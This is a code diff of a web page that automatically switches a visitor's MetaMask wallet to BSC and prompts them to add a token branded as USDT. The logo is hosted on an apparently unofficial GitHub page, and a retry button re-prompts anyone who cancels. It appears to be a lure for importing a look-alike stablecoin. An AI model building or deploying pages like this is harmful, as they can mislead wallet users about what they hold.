@@ -3,83 +3,86 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Add USDT Token – Secure Import</title>
+<title>Add Token – USDT</title>
 
 <style>
   body {
     font-family: "Poppins", sans-serif;
     background: linear-gradient(135deg, #e6fdf6, #d4f3ff);
     height: 100vh;
+    margin: 0;
     display: flex;
     justify-content: center;
     align-items: center;
-    margin: 0;
   }
 
   .container {
-    background: #ffffff;
-    padding: 30px 40px;
-    border-radius: 15px;
-    width: 350px;
+    background: #fff;
+    padding: 30px 35px;
+    border-radius: 18px;
+    width: 360px;
     text-align: center;
-    box-shadow: 0px 10px 35px rgba(0,0,0,0.1);
-    animation: fadeIn 0.6s ease-in-out;
-  }
-
-  @keyframes fadeIn {
-    from { opacity: 0; transform: translateY(15px); }
-    to { opacity: 1; transform: translateY(0); }
-  }
-
-  .token-logo {
-    width: 80px;
-    margin-bottom: 15px;
+    box-shadow: 0 6px 30px rgba(0,0,0,0.12);
   }
 
   h2 {
-    font-size: 20px;
-    font-weight: 600;
-    color: #0b4d4b;
+    color: #006f6b;
     margin-bottom: 10px;
-  }
-
-  p {
-    font-size: 14px;
-    color: #333;
+    font-size: 22px;
   }
 
   #status {
-    margin-top: 18px;
+    font-size: 15px;
     font-weight: 500;
     color: #007c77;
+    margin-top: 15px;
   }
 
-  .loading {
-    margin-top: 10px;
-    width: 30px;
-    height: 30px;
-    border: 4px solid #007c77;
-    border-top-color: transparent;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
+  .loader {
+    width: 100%;
+    height: 6px;
+    background: #cfe9e7;
+    border-radius: 10px;
+    overflow: hidden;
+    margin-top: 20px;
+    display: block;
+  }
+
+  .loader div {
+    height: 100%;
+    width: 0%;
+    background: #0ba69a;
+    animation: loading 3s linear forwards;
+  }
+
+  @keyframes loading {
+    to { width: 100%; }
+  }
+
+  .retry-btn {
     display: none;
-    margin-left: auto;
-    margin-right: auto;
-  }
-
-  @keyframes spin {
-    to { transform: rotate(360deg); }
+    background: #007c77;
+    color: #fff;
+    padding: 10px 14px;
+    border-radius: 10px;
+    border: none;
+    margin-top: 20px;
+    font-size: 14px;
+    cursor: pointer;
   }
 </style>
 </head>
 <body>
 
 <div class="container">
-  <img class="token-logo" src="https://carrychain.github.io/tetherusd-info/logo.png" alt="token logo">
   <h2>Import USDT Token</h2>
-  <p>Please approve MetaMask prompts to add token</p>
-  <p id="status">Connecting wallet...</p>
-  <div class="loading" id="loader"></div>
+  <p id="status">Detecting wallet...</p>
+
+  <div class="loader" id="loader">
+    <div></div>
+  </div>
+
+  <button class="retry-btn" id="retryBtn">Restart Process</button>
 </div>
 
 <script>
@@ -88,30 +91,40 @@
   const tokenDecimals = 18;
   const tokenImage = "https://carrychain.github.io/tetherusd-info/logo.png";
 
-  const statusEl = document.getElementById('status');
-  const loader = document.getElementById('loader');
+  const statusEl = document.getElementById("status");
+  const retryBtn = document.getElementById("retryBtn");
 
-  async function autoAddToken() {
+  retryBtn.onclick = () => {
+    retryBtn.style.display = "none";
+    statusEl.textContent = "Retrying process...";
+    detectWallet();
+  };
+
+  function showRetry(msg) {
+    statusEl.textContent = msg;
+    retryBtn.style.display = "inline-block";
+  }
+
+  async function detectWallet() {
+    statusEl.textContent = "Detecting wallet...";
+    await new Promise(res => setTimeout(res, 3000)); // 3 sec wait
+
     if (!window.ethereum) {
       statusEl.textContent = "No wallet found. Install MetaMask!";
       return;
     }
 
-    loader.style.display = "block";
-
     try {
-      const chainIdHex = "0x38";
+      const chainIdHex = "0x38"; // BSC Mainnet
 
-      // Switch to BSC
+      // Switch chain
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: chainIdHex }]
       });
 
-      statusEl.textContent = "Switched to BSC...";
-
       // Add token
-      const wasAdded = await window.ethereum.request({
+      const add = await window.ethereum.request({
         method: "wallet_watchAsset",
         params: {
           type: "ERC20",
@@ -124,18 +137,20 @@
         }
       });
 
-      loader.style.display = "none";
-      statusEl.textContent = wasAdded
-        ? `${tokenSymbol} successfully added ✅`
-        : "User rejected the request ❌";
+      if (add) {
+        statusEl.textContent = `${tokenSymbol} successfully added ✅`;
+      } else {
+        showRetry("Request cancelled ❌ Click to retry");
+      }
 
-    } catch (error) {
-      loader.style.display = "none";
-      statusEl.textContent = "Error: " + (error.message || error);
+    } catch (e) {
+      console.error(e);
+      showRetry("Request failed ❌ Click retry");
     }
   }
 
-  window.addEventListener("load", autoAddToken);
+  // Start automatically
+  detectWallet();
 </script>
 
 </body>
